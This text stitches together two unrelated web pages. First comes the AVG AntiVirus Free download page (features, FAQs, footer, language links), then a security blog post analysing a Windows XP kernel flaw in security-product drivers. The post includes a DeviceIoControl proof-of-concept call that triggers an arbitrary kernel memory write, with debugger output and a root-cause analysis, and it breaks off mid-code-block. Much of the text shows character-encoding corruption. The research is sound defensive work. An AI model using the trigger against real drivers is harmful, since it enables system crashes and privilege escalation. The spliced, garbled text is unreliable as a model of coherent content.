![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-rescue-disk.svg)
Fight back against scan-resistant malware
[Boot your PC](https://www.avg.com/en/signal/how-to-speed-up-boot-time-on-your-pc-or-laptop) from an external CD or USB drive to help detect cyberthreats that counteract antivirus scans. Increase your chances of removing stubborn digital threats and back up valuable data.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-protect-privacy--lock-laptop.svg)
Quarantine dangerous files automatically
Lock away potentially hazardous files to help defend your operating system. Plus, send them to us for analysis. Quarantined files canât access your system of data, protecting your device from harm.

![Award-winning by nature, not just by name](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/illu-goblet.svg)
## Award-winning by nature, not just by name

Weâve addedÂ **25 new accolades**Â in the past two years to the hundreds we have won since we started in 1991. Our top score means you know youâre in good hands with our PC security software.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/illu-laurel-1.svg)
![](https://static2.avg.com/10004117/web/i/awards/2023/av-test--best-protection-2023.png)
2024
**Best Protection**

![](https://static2.avg.com/10004117/web/i/awards/2023/av-comparatives--top-product-2023.png)
2024
**Top Rated Product**

![](https://static2.avg.com/10004117/web/i/awards/2023/av-comparatives--malware-protection-gold-2023.png)
2023
**Malware Protection**

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/illu-laurel-2.svg)

![Download AVG AntiVirus Free](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/free-antivirus-icon--bottom-section.svg)
## Download AVG AntiVirus Free

Keep yourself safer against viruses, online scams, unsafe emails, and more.
Our Windows antivirus software for PCs and laptops is just a click away.

[Free download](/en-eu/download-thank-you.php?product=FREEGSR-FAD&variant=1606)

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/bottom-section.png)

### How to install

* First, [download](/en-eu/download-thank-you.php?product=FREEGSR-FAD) the installation wizard using the button at the top of the page.
* Once itâs downloaded, double-click the installation wizard to run it.
* Follow on-screen application instructions.
* Youâre done! Run your first scan and start securing your PC today.

For more detailed instructions, please go to our installation [support page](https://support.avg.com/SupportArticleView?l=en&urlname=Install-AVG-AntiVirus-Free).

### Usage

For personal and family use only. Not for business or commercial use.

### System requirements

![icon windows](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-windows.svg)

[Windows 11](/en-eu/windows-11-antivirus), [Windows 10](/en-eu/windows-10-antivirus), [8](/en-eu/windows-8-antivirus), and [7](/en-eu/windows-7-antivirus) (Windows XP can be found [here](/en-eu/windows-xp-antivirus))

![icon mac](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-mac.svg)

MacOS 10.13 (High Sierra) or later

![icon android](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/icon-android-v2.svg)

Android 5.0 (Lollipop, API 21) or above

![icon ios](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-ios.svg)

iOS 10.0 or above

### Languages

For Windows: Chinese (simplified), Chinese (traditional), Czech, Danish, Dutch, English, French, German, Hungarian, Indonesian, Italian, Japanese, Korean, Malay, Polish, Portuguese (Brazil), Portuguese (Portugal), Russian, Serbian, Slovak, Spanish, and Turkish.

For Mac: English only.

For Android: Arabic, Chinese (simplified), Chinese (traditional), Czech, Danish, Dutch, English, Finnish, French, German, Greek, Hebrew, Hindi, Hungarian, Indonesian, Italian, Japanese, Korean, Malay, Norwegian, Polish, Portuguese (Brazil), Portuguese (Portugal), Russian, Serbian, Slovak, Spanish, Swedish, Thai, Turkish, Ukrainian, and Vietnamese.

For iOS: Arabic, Chinese (traditional), Czech, Dutch, English, French, German, Hindi, Italian, Japanese, Korean, Polish, Portuguese (Brazil), Russian, Spanish, Thai, Turkish, and Vietnamese.

## FAQs

#### What makes AVG AntiVirus Free one of the best free antivirus software options?

There are various options open to users who want to download [the best free antivirus software](https://www.avg.com/en/signal/best-free-antivirus-software). AVG has been protecting users for more than 30 years and offers a free download of antivirus software for PC, Mac, Android, and iPhone/iPad. AVG also offers [free protection against spyware](https://www.avg.com/en/signal/anti-spyware-tool) as well as [free protection against Trojan horse malware](https://www.avg.com/en/signal/trojan-remover).

#### How does AVG AntiVirus Free protect against viruses and other threats?

New threats are always emerging, but AVGâs free virus protection keeps you safe. AVG even offers protection against [spyware](https://www.avg.com/en/signal/what-is-spyware), [webcam threats](https://www.avg.com/en/signal/end-webcam-spying-for-good-avg-webcam-protection), [ransomware](https://www.avg.com/en/signal/ransomware-protection-tool), [rootkits](https://www.avg.com/en/signal/rootkit-scanner-tool), [hackers](https://www.avg.com/en/signal/what-is-hacking), and more. While built-in PC protection like [Windows Defender](https://www.avg.com/en/signal/how-good-is-windows-defender) might stop some of the threats youâll face, itâs crucial to have antivirus software like AVGâs to make sure you donât leave yourself vulnerable to more sophisticated threats.

#### Why does my PC need antivirus software?

You need antivirus software if you want to protect your PC against viruses, malware, [ransomware](https://www.avg.com/en/signal/what-is-ransomware), and the variety of other online threats out there.

Windows Defender will guard against standard types of malware, but it wonât match the comprehensive security youâll get with a powerful, third-party antivirus solution like AVG AntiVirus Free for PC. Now known as Microsoft Defender, [Windows Defender doesnât offer enough protection](https://www.avg.com/en/signal/how-good-is-windows-defender) against [phishing attacks](https://www.avg.com/en/signal/what-is-phishing) on all browsers, nor does it perform quite as highly as AVG AntiVirus Free in leading independent tests.

#### How will AVG AntiVirus Free affect my computer's performance?

It's very simple to download and run a free virus scan to check for viruses and other malware on your computer. AVG offers a [free virus scanner and malware removal tool](https://www.avg.com/en/signal/malware-and-virus-removal-tool) which takes seconds to install. All you have to do is:

* Click [Download](/en-eu/download-thank-you.php?product=FREEGSR-FAD) to download the installer file.
* Click on the downloaded installer file.
* Follow the simple instructions to complete the installation of your free AVG virus scan tool.

#### What is a computer virus?

You can check out our guide for how to manually [get rid of viruses from your computer](https://www.avg.com/en/signal/how-to-get-rid-of-a-virus-or-malware-on-your-computer), or you can download a great virus removal tool like AVG AntiVirus Free and start protecting your PC in real time today. Whether you're working on a Windows 10 desktop device or laptop, AVG AntiVirus Free automatically detects and blocks incoming viruses and other malware while scanning and removing any existing malware.

#### How do I get rid of a virus?

A [computer virus](https://www.avg.com/en/signal/what-is-a-computer-virus) is a [type of malware](https://www.avg.com/en/signal/what-is-malware) that infects your computer often through malicious downloads or deceptive links. Viruses are designed to spread themselves across files and programs as well as across networks to other devices. Indications that you may have a virus on your computer include slowdowns, [invasive pop-ups](https://www.avg.com/en/signal/what-is-adware), crashes, and other issues.

#### Are virus protectors worth it?

Yes, always. Without them, malware of all kinds have the potential to cause you problems. Viruses can damage software and data. Spyware can undermine your privacy and steal data. Ransomware can encrypt your files so you can no longer access them. Itâs also important to do more to secure your home Wi-Fi from cybercriminals and defend the network traffic between your PC and the internet.

Our free antivirus software for PCs, AVG AntiVirus Free, supports you with all of these things. Plus, you can monitor your in-going and outgoing email messages for potential cyberthreats â all for free. Do it all from one easy-to-use app.

#### What does a virus blocker do?

Typically, virus blockers automatically scan the files and apps on your PC for potential malware. When we refer to malware, we mean viruses and other digital threats. Most virus blockers help stop more than just viruses. Some also protect you as you browse the web, blocking dangerous downloads or links.

Digital threats can come from many different angles. So itâs also important for PC antivirus software to help defend you from email-based cyberthreats or to support you in defending your home Wi-Fi network from cybercrime.

AVG AntiVirus Free helps with all the things weâve mentioned. Plus, you guessed it, itâs completely free to use.

#### Is there a free virus scan for laptops?

If you have Windows, then our free antivirus software for PCs will work for you. It can help you block various types of malware, including viruses. Plus, it can support you to defend yourself from phishing attacks and email-based cyberthreats while helping to protect your home Wi-Fi network from cybercriminals. You can do all of this and more for free!

## Get expert advice on security, privacy, and device performance

[See all articles](https://www.avg.com/en/signal)

[![](https://f.hubspotusercontent40.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/How%20to%20Remove%20a%20Virus%20from%20Your%20iPhone%20or%20Android%20Phone/How_to_Remove_a_Virus_from_Phones-Thumb.jpg?width=312)
#### How to Find and Clean Viruses on Android Phones or iPhones

Learn how to remove viruses from your Android phone and iPhone with our expert guide. Scan and remove mobile malware, then protect against future threats.

Read more](https://www.avg.com/en/signal/remove-phone-virus)
[![](https://4650993.fs1.hubspotusercontent-na1.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/is_windows_defender_enough_signal/Signal-Windows-Defender-vs-Full-Scale-Antivirus-Thumb.jpg?width=312)
#### Microsoft Defender vs. Full-Scale Antivirus

Microsoft's antivirus tool protects against some malware and other threats, but is Windows Defender good enough compared to other AV solutions?

Read more](https://www.avg.com/en/signal/how-good-is-windows-defender)
[![](https://4650993.fs1.hubspotusercontent-na1.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/how_to_spot_a_fake_virus_warning_signal/Signal-How-to-Spot-a-Fake-Virus-Warning-Thumb.jpg?width=312)
#### Fake Virus Warnings: How to Spot and Avoid Them

Concerned about fake virus alerts? Learn how to detect fake virus warning pages and pop-up malware and avoid a real attack.

Read more](https://www.avg.com/en/signal/spot-fake-virus-warning)
[![](https://f.hubspotusercontent40.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/What%20is%20a%20Trojan%20Hourse/What_is_a_Trojan_Horse-Thumb.jpg?width=312)
#### What is a Trojan Horse? Is it Malware or Virus?

In computing, a Trojan horse is a decoy that hides malware. Find out what a Trojan is and how to detect and protect against this sneaky type of attack.

Read more](https://www.avg.com/en/signal/what-is-a-trojan)
[![](https://f.hubspotusercontent40.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/How%20to%20remove%20a%20virus%20from%20your%20router/How_to_remove_a_virus_from_your_router-Thumb.jpg?width=312)
#### How to Scan and Remove Malware From Your Router

Did you know that your router may be vulnerable to malware? Learn how to scan and remove malware from your router with our expert guide.

Read more](https://www.avg.com/en/signal/remove-router-virus)
[![](https://f.hubspotusercontent40.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/How_to_Check_if_a_Website_is_Safe_Signal_refresh/How_to_Check_if_a_Website_is_Safe-Thumb-refresh.jpg?width=312)
#### Fake Website Check: How to Check If a Website Is Safe or Trying to Scam You

Website safety checks are vital to staying safe online, but how can you tell if a site is secure? Use a website safety checker and follow these tips.

Read more](https://www.avg.com/en/signal/website-safety)
[![](https://4650993.fs1.hubspotusercontent-na1.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/how_to_remove_iphone_calendar_viruses_signal/Signal-iPhone-Calendar-Virus-Thumb.jpg?width=312)
#### iPhone Calendar Virus: What Is It and How Do You Get Rid of It?

Learn how to get rid of iPhone calendar viruses and how to stop receiving spam event invitations to your iPhone calendar.

Read more](https://www.avg.com/en/signal/remove-iphone-calendar-virus)
[![](https://4650993.fs1.hubspotusercontent-na1.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/what_is_eternal_blue_signal/Signal-EternalBlue-Exploit-Thumb.jpg?width=312)
#### EternalBlue Exploit: What Is It and Is It Still a Threat?

The EternalBlue exploit â is it still a threat? This NSA exploit is still causing problems on the web. Learn how to defend against EternalBlue.

Read more](https://www.avg.com/en/signal/eternal-blue)
[![](https://4650993.fs1.hubspotusercontent-na1.net/hub/4650993/Blog_Content/Avg/Signal/AVG%20Signal%20Images/is_snapchat_safe_for_kids_signal/is-snapchat-safe-thumb.jpg?width=312)
#### Is Snapchat Safe for Kids? What Every Parent Should Know

Is Snapchat safe for your kids? Discover the age requirements, dangers how to manage Snapchat parental controls.

Read more](https://www.avg.com/en/signal/is-snapchat-safe)

![Previous](https://static2.avg.com/10004117/web/i/buttons/facelift/arrow-left-white.svg)

![Next](https://static2.avg.com/10004117/web/i/buttons/facelift/arrow-right-white.svg)

#### About AVG

* [Profile](/en-eu/profile)
* [Press Center](https://press.avg.com)
* [Policies](/en-eu/policies)
* [Awards](/en-eu/awards)
* [Contact Us](/en-eu/contacts)

#### Home Products

* [Free Antivirus Download](/en-eu/free-antivirus-download)
* [Internet Security](/en-eu/internet-security)
* [Android Antivirus](/en-eu/antivirus-for-android)
* [Free Mac Antivirus](/en-eu/avg-antivirus-for-mac)
* [Secure VPN](/en-eu/secure-vpn)
* [TuneUp](/en-eu/avg-pctuneup)
* [Virus Scanning & Malware Removal](/en/signal/malware-and-virus-removal-tool)
* [Installation Files](/en-eu/installation-files)
* [Beta Downloads](/en-eu/beta)
* [Driver Updater](/en-eu/avg-driver-updater)

#### Customer Area

* [Register Your License](/en-eu/activation)
* [Home Product Support](https://support.avg.com?l=en)
* [Security & Performance Tips](/en/signal)
* [Online Research](/en-ww/online-research-main)

#### Partners & Business

* [Partner Support](https://support.avg.com/partners?l=en)
* [Affiliates](/en-eu/affiliate/become-an-avg-affiliate)

![AVG Logo](https://static2.avg.com/10004117/web/i/components/avg-logo-white-v2.svg)

* [X](https://x.com/avgfree)
* [Facebook](https://www.facebook.com/AVG/)
* [YouTube](https://www.youtube.com/AVG)
* [LinkedIn](https://www.linkedin.com/company/avg/)

English
![icon arrow down](https://static2.avg.com/10004117/web/i/components/arrow-down.svg)

[Log in to AVG MyAccount](https://account.avg.com/?migration&utm_campaign=myaccount_web_footer)

[Privacy](/en-eu/privacy) | [Report vulnerability](https://www.avast.com/coordinated-vulnerability-disclosure) | [Contact security](https://www.avast.com/bug-bounty) | [License agreements](/en-eu/eula) | [Modern Slavery Statement](https://static2.avg.com/10004117/web/o/legal/Avast-Modern-Slavery-Statement-2022.pdf) | [Cookies](/en-eu/cookies) | [Accessibility Statement](/en-ww/accessibility-statement) | [Do not sell or share my info](https://www.avg.com/en-ww/do-not-sell) | [Subscription details](/en-eu/subscription-details) |
| [All third party trademarks are the property of their respective owners.](/en-eu/trademarks)
| Â© 2025 Gen Digital Inc. All rights reserved.

#### Change language

* Global Website:
  [EspaÃ±ol](/es-ww/free-antivirus-download)
  /
  [Worldwide (English)](/en-ww/free-antivirus-download)
  /
  [Europe (English)](/en-eu/free-antivirus-download)
* Argentina: [EspaÃ±ol](/es-ar/free-antivirus-download)
* Australia: [English](/en-au/free-antivirus-download)
* BelgiÃ«: [Nederlands](/nl-be/free-antivirus-download)
* Belgique: [FranÃ§ais](/fr-be/free-antivirus-download)
* Brasil: [PortuguÃªs do Brasil](/pt-br/free-antivirus-download)
* Canada: [English](/en-ca/free-antivirus-download)
* Canada: [FranÃ§ais](/fr-ca/free-antivirus-download)
* ÄeskÃ¡ republika: [ÄeÅ¡tina](/cs-cz/free-antivirus-download)
* Chile: [EspaÃ±ol](/es-cl/free-antivirus-download)
* Colombia: [EspaÃ±ol](/es-co/free-antivirus-download)
* Denmark: [English](/en-dk/free-antivirus-download)
* Deutschland: [Deutsch](/de-de/free-antivirus-download)

* EspaÃ±a: [EspaÃ±ol](/es-es/free-antivirus-download)
* France: [FranÃ§ais](/fr-fr/free-antivirus-download)
* India: [English](/en-in/free-antivirus-download)
* Indonesia: [Bahasa Indonesia](/id-id/free-antivirus-download)
* Italia: [Italiano](/it-it/free-antivirus-download)
* Malaysia: [Bahasa Melayu](/ms-my/free-antivirus-download)
* MÃ©xico: [EspaÃ±ol](/es-mx/free-antivirus-download)
* Nederland: [Nederlands](/nl-nl/free-antivirus-download)
* New Zealand: [English](/en-nz/free-antivirus-download)
* Norge: [Norsk](/no-no/free-antivirus-download)
* Polska: [Polski](/pl-pl/free-antivirus-download)
* Portugal: [PortuguÃªs](/pt-pt/free-antivirus-download)

* Ð Ð¾ÑÑÐ¸Ñ: [Ð ÑÑÑÐºÐ¸Ð¹](/ru-ru/free-antivirus-download)
* Schweiz: [Deutsch](/de-ch/free-antivirus-download)
* Slovensko: [SlovenÄina](/sk-sk/free-antivirus-download)
* South Africa: [English](/en-za/free-antivirus-download)
* Suisse: [FranÃ§ais](/fr-ch/free-antivirus-download)
* Sweden: [English](/en-se/free-antivirus-download)
* TÃ¼rkiye: [TÃ¼rkÃ§e](/tr-tr/free-antivirus-download)
* United Kingdom: [English](/en-gb/free-antivirus-download)
* United States: [English](/en-us/free-antivirus-download)
* èºç£: [ç¹é«ä¸­æ](/zh-tw/free-antivirus-download)
* æ¥æ¬: [æ¥æ¬èª](/ja-jp/free-antivirus-download)
* ëíë¯¼êµ­: [íêµ­ì´](/ko-kr/free-antivirus-download)

 Global Website:
[EspaÃ±ol](/es-ww/free-antivirus-download)
/
[Worldwide (English)](/en-ww/free-antivirus-download)
/
[Europe (English)](/en-eu/free-antivirus-download)

![](https://static2.avg.com/10004117/web/i/other/avg-logo-226x92.png)
## Looks like youâre using Mac. Would you like this app for Mac or Windows? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Windows. Looks like youâre using iOS. Click the App Store button to get antivirus for iOS. Or download it for Windows. Looks like youâre using Windows. Would you like this app for Windows or Mac? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Mac. Looks like youâre using iOS. Click the App Store button to get antivirus for iOS. Or download it for Mac. This antivirus file is for Android and won't work on your PC. This antivirus file is for Android and won't work on your Mac. This antivirus file is for Android and won't work on your iOS. This antivirus file is for iOS and won't work on your PC. This antivirus file is for iOS and won't work on your Mac. This antivirus file is for iOS and won't work on your Android. This antivirus file is for PC and wonât work on your machine. This antivirus file is for Mac and wonât work on your machine. This antivirus file is for Android and wonât work on your machine. This antivirus file is for iOS and wonât work on your machine. Looks like youâre using Mac. Would you like this app for Mac or Windows? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Windows. Looks like youâre using iOS. This antivirus file won't work on your iOS. Download it for Windows. Looks like youâre using Windows. Would you like this app for Windows or Mac? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Mac. Looks like youâre using iOS. Click the App Store button to get antivirus for iOS. Or download it for Mac. This file is for Android and won't work on your PC. This file is for Android and won't work on your Mac. This file is for Android and won't work on your iOS. This file is for iOS and won't work on your PC. This file is for iOS and won't work on your Mac. This file is for iOS and won't work on your Android. This antivirus file is for PC and wonât work on your machine. This antivirus file is for Mac and wonât work on your machine. This antivirus file is for Android and wonât work on your machine. This antivirus file is for iOS and wonât work on your machine. Looks like youâre using Mac. Would you like this app for Mac or Windows? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Windows. Looks like youâre using iOS. This antivirus file won't work on your iOS. Download it for Windows. Looks like youâre using Windows. Would you like this app for Windows or Mac? Looks like youâre using Android. Click the Google Play button to get antivirus for Android. Or download it for Mac. Looks like youâre using iOS. Click the App Store button to get antivirus for iOS. Or download it for Mac. This VPN file is for Android and won't work on your PC. This VPN file is for Android and won't work on your Mac. This VPN file is for Android and won't work on your iOS. This VPN file is for iOS and won't work on your PC. This VPN file is for iOS and won't work on your Mac. This VPN file is for iOS and won't work on your Android. This antivirus file is for PC and wonât work on your machine. This antivirus file is for Mac and wonât work on your machine. This antivirus file is for Android and wonât work on your machine. This antivirus file is for iOS and wonât work on your machine.

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Windows

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Download it here

Windows
Mac
Android
iOS
(from Google Play)
(from Google Play)
(from Google Play)
Back



=== Content from www.greyhathacker.net_8c398007_20250125_053239.html ===


[GreyHatHacker.NET](https://www.greyhathacker.net/ "GreyHatHacker.NET")

Malware, Vulnerabilities, Exploits and more . . .

#### Menu

* [About](https://www.greyhathacker.net/?page_id=13)

Search for:

# Analysis Of An Interesting Windows Kernel Change Mitigating Vulnerabilities In Some Security Products

Last year I started researching into the Windows kernel to get a better understanding of privilege escalation vulnerabilities. Vulnerabilities in the kernel are a serious issue as they could be used to bypass browsers sandboxes and end up compromising the entire system. In general most people assume that security products are developed with security in mind and can be trusted, so I thought I would start my assessment on security products and see how secure they really are from kernel attacks.Â  Within a couple of months of research six vulnerabilities had already been discovered in various products from different vendors. What was particularly interesting is that they all exhibited the same type of vulnerability, which only seemed to exist on older operating systems.

This blog post details the technical research carried out in order to pinpoint the root cause as to what had changed from Windows XP and Windows Server 2003 to later Windows operating systems.

**The vulnerability**

The vulnerability exists when drivers do not validate the output buffer address and output buffer size. Applications wanting to talk to the kernel communicate through the use of the **DeviceIOControl** function.

```
DeviceIoControl(hDevice, 0x00222000, inbuffer, BUFSIZE, (LPVOID)0xF4F5F6F7, 0, &dwRetBytes, NULL);
```

In this example we can see two things of interest, first is that using LPVOID we can send in a hardcoded output buffer address and second is the output buffer length has been defined to 0. Sending this to a vulnerable driver will trigger a bugcheck.

**Debugger Output**

In the bugcheck analysis below the write address is the same as passed through the DeviceIOControl function, which basically means we have found an arbitrary memory overwrite vulnerability. If we look at the call stack, the bugcheck was triggered in function nt!IopCompleteRequest

```
kd> !analyze -v
***************************************************************************
*                                                                         *
*                        Bugcheck Analysis                                *
*                                                                         *
***************************************************************************

PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.  This cannot be protected by try-except,
it must be protected by a Probe.  Typically the address is just plain bad or it
is pointing at freed memory.
Arguments:
Arg1: f4f5f6f7, memory referenced.
Arg2: 00000001, value 0 = read operation, 1 = write operation.
Arg3: 804ec09b, If non-zero, the instruction address which referenced the bad memory
	address.
Arg4: 00000000, (reserved)

Debugging Details:
------------------

Could not read faulting driver name

WRITE_ADDRESS:  f4f5f6f7

FAULTING_IP:
nt!IopCompleteRequest+92
804ec09b f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

MM_INTERNAL_CODE:  0

CUSTOMER_CRASH_COUNT:  1

DEFAULT_BUCKET_ID:  DRIVER_FAULT

BUGCHECK_STR:  0x50

PROCESS_NAME:  dos_greyhat.exe

IRP_ADDRESS:  86593dd8

DEVICE_OBJECT: 866e10f0

LAST_CONTROL_TRANSFER:  from 804ec11a to 804ec09b

STACK_TEXT:
f411baec 804ec11a 86593e18 f411bb38 f411bb2c nt!IopCompleteRequest+0x92
f411bb3c 806f5c0e 00000000 00000000 f411bb54 nt!KiDeliverApc+0xb3
f411bb3c 806f00b3 00000000 00000000 f411bb54 hal!HalpApcInterrupt2ndEntry+0x31
f411bbc8 804e53cc 86593e18 86593dd8 00000000 hal!KfLowerIrql+0x43
f411bbe8 804ec134 86593e18 8659f3e0 00000000 nt!KeInsertQueueApc+0x4b
f411bc1c f7e99562 8659f3e0 86594390 86593dd8 nt!IopfCompleteRequest+0x1d8
WARNING: Stack unwind information not available. Following frames may be wrong.
f411bc34 804e3767 866e10f0 867cf288 806f0070 ghhpoc+0x562
f411bc44 805682ab 86593e48 8659f3e0 86593dd8 nt!IopfCallDriver+0x31
f411bc58 805771e2 866e10f0 86593dd8 8659f3e0 nt!IopSynchronousServiceTail+0x70
f411bd00 80579705 000007e8 00000000 00000000 nt!IopXxxControlFile+0x611
f411bd34 804de7f8 000007e8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
f411bd34 7c90e514 000007e8 00000000 00000000 nt!KiSystemServicePostCall
0012fe3c 00000000 00000000 00000000 00000000 0x7c90e514

STACK_COMMAND:  kb

FOLLOWUP_IP:
ghhpoc+562
f7e99562 ??              ???

SYMBOL_STACK_INDEX:  6

SYMBOL_NAME:  ghhpoc+562

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: ghhpoc

IMAGE_NAME:  ghhpoc.sys

DEBUG_FLR_IMAGE_TIMESTAMP:  54b18dfe

FAILURE_BUCKET_ID:  0x50_ghhpoc+562

BUCKET_ID:  0x50_ghhpoc+562

Followup: MachineOwner
---------

kd> r
eax=00000008 ebx=86593dd8 ecx=00000002 edx=00000000 esi=867cf288 edi=f4f5f6f7
eip=804ec09b esp=f411baa8 ebp=f411baec iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
nt!IopCompleteRequest+0x92:
804ec09b f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

```

**Vulnerable Driver Analysis**

Reverse engineering the driver the bugcheck is triggered after the call of the function **IofCompleteRequest**.

![](/images/iocompleterequestdemo.png)

The **IoCompleteRequest** function indicates that the driver has completed all processing for a given IRP and is returning the IRP back to the I/O manager. IRP is an I/O request packet and is how Windows communicates with drivers. The IRP data structure contains information used by drivers.

**Comparing IRP data**

Since the goal was to find the root cause as to why this vulnerability only applies to older versions of Windows, I started comparing Windows XP to Windows 7. Setting a breakpoint before our call to the IoCompleteRequest function and looking at the IRP data in WinDbg, we can see UserBuffer contains the address of our output buffer address. One noticeable change was the âFlagsâ value. Windows XP had a value of 0x70 whereas Windows 7 had a value of 0x60030

In Windows XP ebx contains pointer to IRP

```
kd> dt nt!_irp @ebx
Â Â  +0x000 TypeÂ Â Â Â Â Â Â Â Â Â Â Â  : 6
Â Â  +0x002 SizeÂ Â Â Â Â Â Â Â Â Â Â Â  : 0x94
Â Â  +0x004 MdlAddressÂ Â Â Â Â Â  : (null)
Â Â  +0x008 FlagsÂ Â Â Â Â Â Â Â Â Â Â  : 0x70
Â Â  +0x00c AssociatedIrpÂ Â Â  : __unnamed
Â Â  +0x010 ThreadListEntryÂ  : _LIST_ENTRY [ 0x8650dfb0 - 0x8650dfb0 ]
Â Â  +0x018 IoStatusÂ Â Â Â Â Â Â Â  : _IO_STATUS_BLOCK
Â Â  +0x020 RequestorModeÂ Â Â  : 1 ''
Â Â  +0x021 PendingReturnedÂ  : 0 ''
Â Â  +0x022 StackCountÂ Â Â Â Â Â  : 1 ''
Â Â  +0x023 CurrentLocationÂ  : 3 ''
Â Â  +0x024 CancelÂ Â Â Â Â Â Â Â Â Â  : 0 ''
Â Â  +0x025 CancelIrqlÂ Â Â Â Â Â  : 0 ''
Â Â  +0x026 ApcEnvironmentÂ Â  : 0 ''
Â Â  +0x027 AllocationFlagsÂ  : 0xc ''
Â Â  +0x028 UserIosbÂ Â Â Â Â Â Â Â  : 0x0012fe18 _IO_STATUS_BLOCK
Â Â  +0x02c UserEventÂ Â Â Â Â Â Â  : (null)
Â Â  +0x030 OverlayÂ Â Â Â Â Â Â Â Â  : __unnamed
Â Â  +0x038 CancelRoutineÂ Â Â  : (null)
Â Â  +0x03c UserBufferÂ Â Â Â Â Â  : 0xf4f5f6f7
Â Â  +0x040 TailÂ Â Â Â Â Â Â Â Â Â Â Â  : __unnamed
```

In Windows 7 esi contains pointer to IRP

```
kd> dt nt!_irp @esi
Â Â  +0x000 TypeÂ Â Â Â Â Â Â Â Â Â Â Â  : 6
Â Â  +0x002 SizeÂ Â Â Â Â Â Â Â Â Â Â Â  : 0x94
Â Â  +0x004 MdlAddressÂ Â Â Â Â Â  : (null)
Â Â  +0x008 FlagsÂ Â Â Â Â Â Â Â Â Â Â  : 0x60030
Â Â  +0x00c AssociatedIrpÂ Â Â  : <unnamed-tag>
Â Â  +0x010 ThreadListEntryÂ  : _LIST_ENTRY [ 0x85257f94 - 0x85257f94 ]
Â Â  +0x018 IoStatusÂ Â Â Â Â Â Â Â  : _IO_STATUS_BLOCK
Â Â  +0x020 RequestorModeÂ Â Â  : 1 ''
Â Â  +0x021 PendingReturnedÂ  : 0 ''
Â Â  +0x022 StackCountÂ Â Â Â Â Â  : 1 ''
Â Â  +0x023 CurrentLocationÂ  : 3 ''
Â Â  +0x024 CancelÂ Â Â Â Â Â Â Â Â Â  : 0 ''
Â Â  +0x025 CancelIrqlÂ Â Â Â Â Â  : 0 ''
Â Â  +0x026 ApcEnvironmentÂ Â  : 0 ''
Â Â  +0x027 AllocationFlagsÂ  : 0x6 ''
Â Â  +0x028 UserIosbÂ Â Â Â Â Â Â Â  : 0x0023f7b8 _IO_STATUS_BLOCK
Â Â  +0x02c UserEventÂ Â Â Â Â Â Â  : (null)
Â Â  +0x030 OverlayÂ Â Â Â Â Â Â Â Â  : <unnamed-tag>
Â Â  +0x038 CancelRoutineÂ Â Â  : (null)
Â Â  +0x03c UserBufferÂ Â Â Â Â Â  : 0xf4f5f6f7
Â Â  +0x040 TailÂ Â Â Â Â Â Â Â Â Â Â Â  : <unnamed-tag>
```

**IoCompleteRequest Analysis**

The exported function IoCompleteRequest in **ntoskrnl.exe** ends up calling IopCompleteRequest function. We can see on Windows XP that it does a bitwise 40 AND 70 and jumps to the inlined memcpy code which ends up triggering the bugcheck.

![](/images/iopcompleterequestxp.png)

On Windows 7 we see the bitwise 40 AND 30 takes a different codepath and never hits our memcpy.

![](/images/iopcompleterequestw7.png)

The âtest al, 40hâ instruction on Windows 7 branches off to another codepath as its doing a bitwise 40 AND 30 instead of bitwise 40 AND 70 as al=30h on Windows 7 which is from the IRP flags value.

**IopXxxControlFile Analysis**

âSo what causes the flags value to be 30h instead of 70h?â was my next question. After some investigation I discovered that **IopXxxControlFile** held the answer. The IopXxxControlFile function had been called earlier in our call stack. This function does a number of checks and validations on the inputs provided such as if addresses are in user space, buffer lengths, etc. and sets up our data in IRP.

In this function near the beginning it calls the **ProbeForWrite** function which checks if the address falls in the user space range and writable. The first thing the function does though is check the output buffer length, if zero it returns back to the IopXxxControlFile function without even checking the output buffer address. The ProbeForWrite function below is from Windows XP but is also the same for Windows 7.

[![](/images/probeforwritexp.png)](/images/probeforwritexp.png)

Returning back to the IopXxxControlFile function and after a number of checks near the end of the code we see our output buffer address being placed in the IRP UserBuffer field and Flags value being updated to 0x70, all it checks on Windows XP if an output buffer address is available.

![](/images/iopxxxcontrolfilexp.png)

On Windows 7 we finally discover the root cause as to what has changed in the IopXxxControlFile function. It checks the output buffer length instead of the output buffer address. Since the output buffer length is 0 the flags value does not get set to 0x70 thus mitigating the vulnerability.

![](/images/iopxxxcontrolfilew7.png)

**What do these flags values mean?**

So what do these values 10h, 30h, 40h and 70h represent? Searching through wdm.h header file I found these definitions:

```
